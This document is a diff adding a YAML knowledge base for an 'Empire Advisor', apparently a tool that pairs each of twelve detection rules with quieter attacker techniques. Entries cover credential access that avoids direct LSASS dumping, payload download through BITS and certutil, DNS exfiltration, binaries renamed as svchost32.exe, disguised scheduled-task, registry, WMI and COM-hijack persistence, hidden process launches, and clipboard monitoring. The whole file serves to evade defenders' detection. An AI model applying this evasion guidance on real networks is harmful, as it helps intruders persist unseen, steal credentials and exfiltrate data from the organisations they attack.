@@ -1,0 +1,99 @@
+# Empire Advisor Knowledge Base
+# Maps rules to quieter alternative approaches
+
+alternatives:
+  - rule_id: R001
+    suggestion: "Use targeted single-port checks with delays"
+    commands:
+      - "Test-NetConnection -ComputerName <target> -Port <port>"
+      - "Test-Connection -ComputerName <target> -Quiet -Count 1"
+    rationale: "Single connection attempts blend with normal network traffic"
+    citation: "MITRE ATT&CK T1046 - Network Service Scanning (defensive considerations)"
+
+  - rule_id: R002
+    suggestion: "Use token manipulation or indirect memory reading"
+    commands:
+      - "Use process token duplication instead of direct LSASS access"
+      - "Read memory via debugging APIs with smaller footprint"
+    rationale: "Reduces direct LSASS handle creation and mimikatz-style patterns"
+    citation: "Red Team Ops - Credential Access Without Direct Dumping"
+
+  - rule_id: R003
+    suggestion: "Use BITS transfer or disk-based staging"
+    commands:
+      - "Start-BitsTransfer -Source <url> -Destination $env:TEMP\\update.dat"
+      - "certutil -urlcache -split -f <url> file.txt"
+    rationale: "BITS is a legitimate Windows service; certutil generates different telemetry"
+    citation: "LOLBAS - Living Off The Land Binaries"
+
+  - rule_id: R004
+    suggestion: "Use encrypted channels (HTTPS/DNS)"
+    commands:
+      - "Invoke-WebRequest -Uri https://<domain> -UseBasicParsing"
+      - "Use DNS-based exfiltration with TXT queries"
+    rationale: "Encrypted traffic prevents content inspection and reduces alert triggers"
+    citation: "MITRE ATT&CK T1071.001 - Web Protocols (HTTPS)"
+
+  - rule_id: R005
+    suggestion: "Rename binaries and use custom tooling"
+    commands:
+      - "Rename payload to legitimate-looking name (e.g., update.exe, svchost32.exe)"
+      - "Use custom implants without known signatures"
+    rationale: "Avoids signature-based detection of known tool names"
+    citation: "Defense Evasion - Binary Renaming Techniques"
+
+  - rule_id: R006
+    suggestion: "Enumerate incrementally with delays"
+    commands:
+      - "Get-ADUser -Identity <specific_user> -Properties *"
+      - "Use LDAP queries with filters and pagination"
+    rationale: "Targeted queries generate less telemetry than bulk enumeration"
+    citation: "MITRE ATT&CK T1087.002 - Account Discovery: Domain Account"
+
+  - rule_id: R007
+    suggestion: "Use scheduled tasks or WMI subscriptions"
+    commands:
+      - "schtasks /create /tn \"WindowsUpdate\" /tr <path> /sc daily /st 09:00"
+      - "Register-WMIEvent for persistence"
+    rationale: "Scheduled tasks generate less immediate alert volume than service creation"
+    citation: "MITRE ATT&CK T1053.005 - Scheduled Task"
+
+  - rule_id: R008
+    suggestion: "Use less-monitored persistence locations"
+    commands:
+      - "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
+      - "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit"
+    rationale: "Alternative registry keys have lower baseline monitoring rates"
+    citation: "Persistence Techniques - Alternative Registry Locations"
+
+  - rule_id: R009
+    suggestion: "Use WMI event subscriptions or COM hijacking"
+    commands:
+      - "Register-WMIEvent with permanent event subscription"
+      - "Modify COM object registry for hijacking"
+    rationale: "WMI subscriptions are harder to detect than scheduled tasks for many tools"
+    citation: "MITRE ATT&CK T1546.003 - WMI Event Subscription"
+
+  - rule_id: R010
+    suggestion: "Use native execution methods"
+    commands:
+      - "Start-Process with -WindowStyle Hidden"
+      - "Use COM objects for process creation"
+    rationale: "Native PowerShell methods generate less suspicious telemetry than WMI"
+    citation: "Execution Techniques - Process Creation Alternatives"
+
+  - rule_id: R011
+    suggestion: "Use targeted protocol analysis"
+    commands:
+      - "Use netsh trace with specific provider filters"
+      - "Monitor specific process network activity only"
+    rationale: "Filtered capture reduces system impact and detection surface"
+    citation: "MITRE ATT&CK T1040 - Network Sniffing (scoped approach)"
+
+  - rule_id: R012
+    suggestion: "Use clipboard monitoring or targeted hooks"
+    commands:
+      - "Monitor clipboard for sensitive data patterns"
+      - "Hook specific application input rather than system-wide"
+    rationale: "Targeted collection generates less behavioral indicators"
+    citation: "Collection Techniques - Focused Input Monitoring"
